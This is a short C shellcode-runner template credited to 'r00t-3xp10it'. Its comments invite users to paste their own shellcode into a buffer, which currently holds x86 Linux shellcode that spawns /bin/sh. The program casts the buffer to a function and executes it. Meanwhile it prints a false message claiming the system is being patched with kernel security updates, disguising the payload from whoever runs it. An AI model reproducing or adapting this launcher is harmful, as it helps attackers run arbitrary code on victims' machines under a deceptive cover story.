//C-INJECTOR by: [ r00t-3xp10it ] inject shellcode into
//one 'C' function (exec.c) to make it executable, paste your
//shellcode in 'C' format just bellow 'unsigned char buf[] ='
//replacing the existing shellcode by our own...


#include<stdio.h>
#include<string.h>


unsigned char buf[] = 
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69"
"\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";



main()
{

    printf("\nPlease Wait, updating system...\nPatching kernel with latest security updates.\nShellcode Length: %d", strlen(buf));

    int (*ret)() = (int(*)())buf;

    ret();
}

